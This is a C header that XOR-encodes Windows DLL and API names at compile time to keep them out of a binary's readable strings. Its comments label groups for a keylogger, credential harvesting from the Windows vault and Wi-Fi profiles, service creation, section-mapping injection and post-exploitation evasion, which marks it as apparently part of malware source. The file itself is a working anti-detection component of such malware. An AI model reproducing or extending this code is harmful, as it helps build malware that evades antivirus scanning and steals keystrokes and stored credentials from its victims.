/*
 * str_obf.h — Obfuscated string constants for API names and DLL names.
 *
 * Every string is XOR-encrypted with key _XK (0x5A) at compile time.
 * At runtime, declare a stack char array using the S_xxx macro,
 * then call _DEOBF(array) to decrypt in-place.
 *
 * Usage:
 *   char s[] = S_KERNEL32_DLL;   // stack array of XOR'd bytes
 *   _DEOBF(s);                   // decrypt in-place
 *   HMODULE h = LoadLibraryA(s); // use the decrypted string
 *
 * The string never appears in the binary's .rdata section.
 * After use, the stack frame is automatically reclaimed.
 */
#ifndef STR_OBF_H
#define STR_OBF_H

#define _XK 0x5A

/* Decrypt a XOR'd char array in-place. Stops at null terminator. */
#define _DEOBF(arr) do { for(int _i=0;(arr)[_i];_i++) (arr)[_i]^=_XK; } while(0)

/* ═══════════════════════════════════════════════════════════════
 *  DLL name strings
 * ═══════════════════════════════════════════════════════════════ */
#define S_KERNEL32_DLL {'k'^_XK,'e'^_XK,'r'^_XK,'n'^_XK,'e'^_XK,'l'^_XK,'3'^_XK,'2'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_USER32_DLL {'u'^_XK,'s'^_XK,'e'^_XK,'r'^_XK,'3'^_XK,'2'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_ADVAPI32_DLL {'a'^_XK,'d'^_XK,'v'^_XK,'a'^_XK,'p'^_XK,'i'^_XK,'3'^_XK,'2'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_NTDLL_DLL {'n'^_XK,'t'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_OLE32_DLL {'o'^_XK,'l'^_XK,'e'^_XK,'3'^_XK,'2'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_OLEAUT32_DLL {'o'^_XK,'l'^_XK,'e'^_XK,'a'^_XK,'u'^_XK,'t'^_XK,'3'^_XK,'2'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_MSVCRT_DLL {'m'^_XK,'s'^_XK,'v'^_XK,'c'^_XK,'r'^_XK,'t'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_VAULTCLI_DLL {'v'^_XK,'a'^_XK,'u'^_XK,'l'^_XK,'t'^_XK,'c'^_XK,'l'^_XK,'i'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_WLANAPI_DLL {'w'^_XK,'l'^_XK,'a'^_XK,'n'^_XK,'a'^_XK,'p'^_XK,'i'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_DNSAPI_DLL {'d'^_XK,'n'^_XK,'s'^_XK,'a'^_XK,'p'^_XK,'i'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_DSROLE_DLL {'d'^_XK,'s'^_XK,'r'^_XK,'o'^_XK,'l'^_XK,'e'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_IPHLPAPI_DLL {'i'^_XK,'p'^_XK,'h'^_XK,'l'^_XK,'p'^_XK,'a'^_XK,'p'^_XK,'i'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}
#define S_WS2_32_DLL {'w'^_XK,'s'^_XK,'2'^_XK,'_'^_XK,'3'^_XK,'2'^_XK,'.'^_XK,'d'^_XK,'l'^_XK,'l'^_XK,0}

/* ═══════════════════════════════════════════════════════════════
 *  Keylogger / user32 API names
 * ═══════════════════════════════════════════════════════════════ */
#define S_SetWindowsHookExA {'S'^_XK,'e'^_XK,'t'^_XK,'W'^_XK,'i'^_XK,'n'^_XK,'d'^_XK,'o'^_XK,'w'^_XK,'s'^_XK,'H'^_XK,'o'^_XK,'o'^_XK,'k'^_XK,'E'^_XK,'x'^_XK,'A'^_XK,0}
#define S_CallNextHookEx {'C'^_XK,'a'^_XK,'l'^_XK,'l'^_XK,'N'^_XK,'e'^_XK,'x'^_XK,'t'^_XK,'H'^_XK,'o'^_XK,'o'^_XK,'k'^_XK,'E'^_XK,'x'^_XK,0}
#define S_GetForegroundWindow {'G'^_XK,'e'^_XK,'t'^_XK,'F'^_XK,'o'^_XK,'r'^_XK,'e'^_XK,'g'^_XK,'r'^_XK,'o'^_XK,'u'^_XK,'n'^_XK,'d'^_XK,'W'^_XK,'i'^_XK,'n'^_XK,'d'^_XK,'o'^_XK,'w'^_XK,0}
#define S_GetWindowTextA {'G'^_XK,'e'^_XK,'t'^_XK,'W'^_XK,'i'^_XK,'n'^_XK,'d'^_XK,'o'^_XK,'w'^_XK,'T'^_XK,'e'^_XK,'x'^_XK,'t'^_XK,'A'^_XK,0}
#define S_GetKeyState {'G'^_XK,'e'^_XK,'t'^_XK,'K'^_XK,'e'^_XK,'y'^_XK,'S'^_XK,'t'^_XK,'a'^_XK,'t'^_XK,'e'^_XK,0}
#define S_UnhookWindowsHookEx {'U'^_XK,'n'^_XK,'h'^_XK,'o'^_XK,'o'^_XK,'k'^_XK,'W'^_XK,'i'^_XK,'n'^_XK,'d'^_XK,'o'^_XK,'w'^_XK,'s'^_XK,'H'^_XK,'o'^_XK,'o'^_XK,'k'^_XK,'E'^_XK,'x'^_XK,0}
#define S_GetMessageA {'G'^_XK,'e'^_XK,'t'^_XK,'M'^_XK,'e'^_XK,'s'^_XK,'s'^_XK,'a'^_XK,'g'^_XK,'e'^_XK,'A'^_XK,0}
#define S_PostThreadMessageA {'P'^_XK,'o'^_XK,'s'^_XK,'t'^_XK,'T'^_XK,'h'^_XK,'r'^_XK,'e'^_XK,'a'^_XK,'d'^_XK,'M'^_XK,'e'^_XK,'s'^_XK,'s'^_XK,'a'^_XK,'g'^_XK,'e'^_XK,'A'^_XK,0}
#define S_GetModuleHandleA_S {'G'^_XK,'e'^_XK,'t'^_XK,'M'^_XK,'o'^_XK,'d'^_XK,'u'^_XK,'l'^_XK,'e'^_XK,'H'^_XK,'a'^_XK,'n'^_XK,'d'^_XK,'l'^_XK,'e'^_XK,'A'^_XK,0}

/* ═══════════════════════════════════════════════════════════════
 *  Service manager API names (advapi32)
 * ═══════════════════════════════════════════════════════════════ */
#define S_OpenSCManagerW {'O'^_XK,'p'^_XK,'e'^_XK,'n'^_XK,'S'^_XK,'C'^_XK,'M'^_XK,'a'^_XK,'n'^_XK,'a'^_XK,'g'^_XK,'e'^_XK,'r'^_XK,'W'^_XK,0}
#define S_CreateServiceW {'C'^_XK,'r'^_XK,'e'^_XK,'a'^_XK,'t'^_XK,'e'^_XK,'S'^_XK,'e'^_XK,'r'^_XK,'v'^_XK,'i'^_XK,'c'^_XK,'e'^_XK,'W'^_XK,0}
#define S_StartServiceW {'S'^_XK,'t'^_XK,'a'^_XK,'r'^_XK,'t'^_XK,'S'^_XK,'e'^_XK,'r'^_XK,'v'^_XK,'i'^_XK,'c'^_XK,'e'^_XK,'W'^_XK,0}
#define S_DeleteService_S {'D'^_XK,'e'^_XK,'l'^_XK,'e'^_XK,'t'^_XK,'e'^_XK,'S'^_XK,'e'^_XK,'r'^_XK,'v'^_XK,'i'^_XK,'c'^_XK,'e'^_XK,0}
#define S_CloseServiceHandle {'C'^_XK,'l'^_XK,'o'^_XK,'s'^_XK,'e'^_XK,'S'^_XK,'e'^_XK,'r'^_XK,'v'^_XK,'i'^_XK,'c'^_XK,'e'^_XK,'H'^_XK,'a'^_XK,'n'^_XK,'d'^_XK,'l'^_XK,'e'^_XK,0}
#define S_OpenServiceW {'O'^_XK,'p'^_XK,'e'^_XK,'n'^_XK,'S'^_XK,'e'^_XK,'r'^_XK,'v'^_XK,'i'^_XK,'c'^_XK,'e'^_XK,'W'^_XK,0}
#define S_ChangeServiceConfigW {'C'^_XK,'h'^_XK,'a'^_XK,'n'^_XK,'g'^_XK,'e'^_XK,'S'^_XK,'e'^_XK,'r'^_XK,'v'^_XK,'i'^_XK,'c'^_XK,'e'^_XK,'C'^_XK,'o'^_XK,'n'^_XK,'f'^_XK,'i'^_XK,'g'^_XK,'W'^_XK,0}
#define S_QueryServiceConfigW {'Q'^_XK,'u'^_XK,'e'^_XK,'r'^_XK,'y'^_XK,'S'^_XK,'e'^_XK,'r'^_XK,'v'^_XK,'i'^_XK,'c'^_XK,'e'^_XK,'C'^_XK,'o'^_XK,'n'^_XK,'f'^_XK,'i'^_XK,'g'^_XK,'W'^_XK,0}

/* ═══════════════════════════════════════════════════════════════
 *  File / process API names (kernel32)
 * ═══════════════════════════════════════════════════════════════ */
#define S_CopyFileW {'C'^_XK,'o'^_XK,'p'^_XK,'y'^_XK,'F'^_XK,'i'^_XK,'l'^_XK,'e'^_XK,'W'^_XK,0}
#define S_DeleteFileW {'D'^_XK,'e'^_XK,'l'^_XK,'e'^_XK,'t'^_XK,'e'^_XK,'F'^_XK,'i'^_XK,'l'^_XK,'e'^_XK,'W'^_XK,0}
#define S_CancelIoEx {'C'^_XK,'a'^_XK,'n'^_XK,'c'^_XK,'e'^_XK,'l'^_XK,'I'^_XK,'o'^_XK,'E'^_XK,'x'^_XK,0}
#define S_QueryFullProcessImageNameA {'Q'^_XK,'u'^_XK,'e'^_XK,'r'^_XK,'y'^_XK,'F'^_XK,'u'^_XK,'l'^_XK,'l'^_XK,'P'^_XK,'r'^_XK,'o'^_XK,'c'^_XK,'e'^_XK,'s'^_XK,'s'^_XK,'I'^_XK,'m'^_XK,'a'^_XK,'g'^_XK,'e'^_XK,'N'^_XK,'a'^_XK,'m'^_XK,'e'^_XK,'A'^_XK,0}

/* ═══════════════════════════════════════════════════════════════
 *  COM API names (ole32, oleaut32)
 * ═══════════════════════════════════════════════════════════════ */
#define S_CoInitializeEx {'C'^_XK,'o'^_XK,'I'^_XK,'n'^_XK,'i'^_XK,'t'^_XK,'i'^_XK,'a'^_XK,'l'^_XK,'i'^_XK,'z'^_XK,'e'^_XK,'E'^_XK,'x'^_XK,0}
#define S_CoUninitialize {'C'^_XK,'o'^_XK,'U'^_XK,'n'^_XK,'i'^_XK,'n'^_XK,'i'^_XK,'t'^_XK,'i'^_XK,'a'^_XK,'l'^_XK,'i'^_XK,'z'^_XK,'e'^_XK,0}
#define S_CoInitializeSecurity {'C'^_XK,'o'^_XK,'I'^_XK,'n'^_XK,'i'^_XK,'t'^_XK,'i'^_XK,'a'^_XK,'l'^_XK,'i'^_XK,'z'^_XK,'e'^_XK,'S'^_XK,'e'^_XK,'c'^_XK,'u'^_XK,'r'^_XK,'i'^_XK,'t'^_XK,'y'^_XK,0}
#define S_CoCreateInstance {'C'^_XK,'o'^_XK,'C'^_XK,'r'^_XK,'e'^_XK,'a'^_XK,'t'^_XK,'e'^_XK,'I'^_XK,'n'^_XK,'s'^_XK,'t'^_XK,'a'^_XK,'n'^_XK,'c'^_XK,'e'^_XK,0}
#define S_CoSetProxyBlanket {'C'^_XK,'o'^_XK,'S'^_XK,'e'^_XK,'t'^_XK,'P'^_XK,'r'^_XK,'o'^_XK,'x'^_XK,'y'^_XK,'B'^_XK,'l'^_XK,'a'^_XK,'n'^_XK,'k'^_XK,'e'^_XK,'t'^_XK,0}
#define S_SysAllocString {'S'^_XK,'y'^_XK,'s'^_XK,'A'^_XK,'l'^_XK,'l'^_XK,'o'^_XK,'c'^_XK,'S'^_XK,'t'^_XK,'r'^_XK,'i'^_XK,'n'^_XK,'g'^_XK,0}
#define S_SysFreeString {'S'^_XK,'y'^_XK,'s'^_XK,'F'^_XK,'r'^_XK,'e'^_XK,'e'^_XK,'S'^_XK,'t'^_XK,'r'^_XK,'i'^_XK,'n'^_XK,'g'^_XK,0}
#define S_VariantInit {'V'^_XK,'a'^_XK,'r'^_XK,'i'^_XK,'a'^_XK,'n'^_XK,'t'^_XK,'I'^_XK,'n'^_XK,'i'^_XK,'t'^_XK,0}
#define S_VariantClear {'V'^_XK,'a'^_XK,'r'^_XK,'i'^_XK,'a'^_XK,'n'^_XK,'t'^_XK,'C'^_XK,'l'^_XK,'e'^_XK,'a'^_XK,'r'^_XK,0}

/* ═══════════════════════════════════════════════════════════════
 *  Credential harvest API names (vaultcli, wlanapi)
 * ═══════════════════════════════════════════════════════════════ */
#define S_VaultEnumerateVaults {'V'^_XK,'a'^_XK,'u'^_XK,'l'^_XK,'t'^_XK,'E'^_XK,'n'^_XK,'u'^_XK,'m'^_XK,'e'^_XK,'r'^_XK,'a'^_XK,'t'^_XK,'e'^_XK,'V'^_XK,'a'^_XK,'u'^_XK,'l'^_XK,'t'^_XK,'s'^_XK,0}
#define S_VaultOpenVault {'V'^_XK,'a'^_XK,'u'^_XK,'l'^_XK,'t'^_XK,'O'^_XK,'p'^_XK,'e'^_XK,'n'^_XK,'V'^_XK,'a'^_XK,'u'^_XK,'l'^_XK,'t'^_XK,0}
#define S_VaultEnumerateItems {'V'^_XK,'a'^_XK,'u'^_XK,'l'^_XK,'t'^_XK,'E'^_XK,'n'^_XK,'u'^_XK,'m'^_XK,'e'^_XK,'r'^_XK,'a'^_XK,'t'^_XK,'e'^_XK,'I'^_XK,'t'^_XK,'e'^_XK,'m'^_XK,'s'^_XK,0}
#define S_VaultCloseVault {'V'^_XK,'a'^_XK,'u'^_XK,'l'^_XK,'t'^_XK,'C'^_XK,'l'^_XK,'o'^_XK,'s'^_XK,'e'^_XK,'V'^_XK,'a'^_XK,'u'^_XK,'l'^_XK,'t'^_XK,0}
#define S_VaultFree {'V'^_XK,'a'^_XK,'u'^_XK,'l'^_XK,'t'^_XK,'F'^_XK,'r'^_XK,'e'^_XK,'e'^_XK,0}
#define S_WlanOpenHandle {'W'^_XK,'l'^_XK,'a'^_XK,'n'^_XK,'O'^_XK,'p'^_XK,'e'^_XK,'n'^_XK,'H'^_XK,'a'^_XK,'n'^_XK,'d'^_XK,'l'^_XK,'e'^_XK,0}
#define S_WlanCloseHandle {'W'^_XK,'l'^_XK,'a'^_XK,'n'^_XK,'C'^_XK,'l'^_XK,'o'^_XK,'s'^_XK,'e'^_XK,'H'^_XK,'a'^_XK,'n'^_XK,'d'^_XK,'l'^_XK,'e'^_XK,0}
#define S_WlanEnumInterfaces {'W'^_XK,'l'^_XK,'a'^_XK,'n'^_XK,'E'^_XK,'n'^_XK,'u'^_XK,'m'^_XK,'I'^_XK,'n'^_XK,'t'^_XK,'e'^_XK,'r'^_XK,'f'^_XK,'a'^_XK,'c'^_XK,'e'^_XK,'s'^_XK,0}
#define S_WlanGetProfileList {'W'^_XK,'l'^_XK,'a'^_XK,'n'^_XK,'G'^_XK,'e'^_XK,'t'^_XK,'P'^_XK,'r'^_XK,'o'^_XK,'f'^_XK,'i'^_XK,'l'^_XK,'e'^_XK,'L'^_XK,'i'^_XK,'s'^_XK,'t'^_XK,0}
#define S_WlanGetProfile {'W'^_XK,'l'^_XK,'a'^_XK,'n'^_XK,'G'^_XK,'e'^_XK,'t'^_XK,'P'^_XK,'r'^_XK,'o'^_XK,'f'^_XK,'i'^_XK,'l'^_XK,'e'^_XK,0}
#define S_WlanFreeMemory {'W'^_XK,'l'^_XK,'a'^_XK,'n'^_XK,'F'^_XK,'r'^_XK,'e'^_XK,'e'^_XK,'M'^_XK,'e'^_XK,'m'^_XK,'o'^_XK,'r'^_XK,'y'^_XK,0}

/* ═══════════════════════════════════════════════════════════════
 *  DNS / network API names
 * ═══════════════════════════════════════════════════════════════ */
#define S_DnsGetCacheDataTable {'D'^_XK,'n'^_XK,'s'^_XK,'G'^_XK,'e'^_XK,'t'^_XK,'C'^_XK,'a'^_XK,'c'^_XK,'h'^_XK,'e'^_XK,'D'^_XK,'a'^_XK,'t'^_XK,'a'^_XK,'T'^_XK,'a'^_XK,'b'^_XK,'l'^_XK,'e'^_XK,0}
#define S_GetAdaptersAddresses {'G'^_XK,'e'^_XK,'t'^_XK,'A'^_XK,'d'^_XK,'a'^_XK,'p'^_XK,'t'^_XK,'e'^_XK,'r'^_XK,'s'^_XK,'A'^_XK,'d'^_XK,'d'^_XK,'r'^_XK,'e'^_XK,'s'^_XK,'s'^_XK,'e'^_XK,'s'^_XK,0}

/* ═══════════════════════════════════════════════════════════════
 *  Domain / directory API names
 * ═══════════════════════════════════════════════════════════════ */
#define S_DsRoleGetPrimaryDomainInformation {'D'^_XK,'s'^_XK,'R'^_XK,'o'^_XK,'l'^_XK,'e'^_XK,'G'^_XK,'e'^_XK,'t'^_XK,'P'^_XK,'r'^_XK,'i'^_XK,'m'^_XK,'a'^_XK,'r'^_XK,'y'^_XK,'D'^_XK,'o'^_XK,'m'^_XK,'a'^_XK,'i'^_XK,'n'^_XK,'I'^_XK,'n'^_XK,'f'^_XK,'o'^_XK,'r'^_XK,'m'^_XK,'a'^_XK,'t'^_XK,'i'^_XK,'o'^_XK,'n'^_XK,0}
#define S_DsRoleFreeMemory {'D'^_XK,'s'^_XK,'R'^_XK,'o'^_XK,'l'^_XK,'e'^_XK,'F'^_XK,'r'^_XK,'e'^_XK,'e'^_XK,'M'^_XK,'e'^_XK,'m'^_XK,'o'^_XK,'r'^_XK,'y'^_XK,0}

/* ═══════════════════════════════════════════════════════════════
 *  Ntdll API names (for injection)
 * ═══════════════════════════════════════════════════════════════ */
#define S_NtCreateSection {'N'^_XK,'t'^_XK,'C'^_XK,'r'^_XK,'e'^_XK,'a'^_XK,'t'^_XK,'e'^_XK,'S'^_XK,'e'^_XK,'c'^_XK,'t'^_XK,'i'^_XK,'o'^_XK,'n'^_XK,0}
#define S_NtMapViewOfSection {'N'^_XK,'t'^_XK,'M'^_XK,'a'^_XK,'p'^_XK,'V'^_XK,'i'^_XK,'e'^_XK,'w'^_XK,'O'^_XK,'f'^_XK,'S'^_XK,'e'^_XK,'c'^_XK,'t'^_XK,'i'^_XK,'o'^_XK,'n'^_XK,0}
#define S_NtUnmapViewOfSection {'N'^_XK,'t'^_XK,'U'^_XK,'n'^_XK,'m'^_XK,'a'^_XK,'p'^_XK,'V'^_XK,'i'^_XK,'e'^_XK,'w'^_XK,'O'^_XK,'f'^_XK,'S'^_XK,'e'^_XK,'c'^_XK,'t'^_XK,'i'^_XK,'o'^_XK,'n'^_XK,0}

/* ═══════════════════════════════════════════════════════════════
 *  Process thread attribute API names (evasion_postex)
 * ═══════════════════════════════════════════════════════════════ */
#define S_InitializeProcThreadAttributeList {'I'^_XK,'n'^_XK,'i'^_XK,'t'^_XK,'i'^_XK,'a'^_XK,'l'^_XK,'i'^_XK,'z'^_XK,'e'^_XK,'P'^_XK,'r'^_XK,'o'^_XK,'c'^_XK,'T'^_XK,'h'^_XK,'r'^_XK,'e'^_XK,'a'^_XK,'d'^_XK,'A'^_XK,'t'^_XK,'t'^_XK,'r'^_XK,'i'^_XK,'b'^_XK,'u'^_XK,'t'^_XK,'e'^_XK,'L'^_XK,'i'^_XK,'s'^_XK,'t'^_XK,0}
#define S_UpdateProcThreadAttribute {'U'^_XK,'p'^_XK,'d'^_XK,'a'^_XK,'t'^_XK,'e'^_XK,'P'^_XK,'r'^_XK,'o'^_XK,'c'^_XK,'T'^_XK,'h'^_XK,'r'^_XK,'e'^_XK,'a'^_XK,'d'^_XK,'A'^_XK,'t'^_XK,'t'^_XK,'r'^_XK,'i'^_XK,'b'^_XK,'u'^_XK,'t'^_XK,'e'^_XK,0}
#define S_DeleteProcThreadAttributeList {'D'^_XK,'e'^_XK,'l'^_XK,'e'^_XK,'t'^_XK,'e'^_XK,'P'^_XK,'r'^_XK,'o'^_XK,'c'^_XK,'T'^_XK,'h'^_XK,'r'^_XK,'e'^_XK,'a'^_XK,'d'^_XK,'A'^_XK,'t'^_XK,'t'^_XK,'r'^_XK,'i'^_XK,'b'^_XK,'u'^_XK,'t'^_XK,'e'^_XK,'L'^_XK,'i'^_XK,'s'^_XK,'t'^_XK,0}

/* Wide string variant for vaultcli.dll, wlanapi.dll, dnsapi.dll */
#define SW_VAULTCLI_DLL {L'v'^_XK,L'a'^_XK,L'u'^_XK,L'l'^_XK,L't'^_XK,L'c'^_XK,L'l'^_XK,L'i'^_XK,L'.'^_XK,L'd'^_XK,L'l'^_XK,L'l'^_XK,0}
#define SW_WLANAPI_DLL {L'w'^_XK,L'l'^_XK,L'a'^_XK,L'n'^_XK,L'a'^_XK,L'p'^_XK,L'i'^_XK,L'.'^_XK,L'd'^_XK,L'l'^_XK,L'l'^_XK,0}
#define SW_DNSAPI_DLL {L'd'^_XK,L'n'^_XK,L's'^_XK,L'a'^_XK,L'p'^_XK,L'i'^_XK,L'.'^_XK,L'd'^_XK,L'l'^_XK,L'l'^_XK,0}

/* Wide string deobfuscation */
#define _DEOBF_W(arr) do { for(int _i=0;(arr)[_i];_i++) (arr)[_i]^=_XK; } while(0)

#endif /* STR_OBF_H */
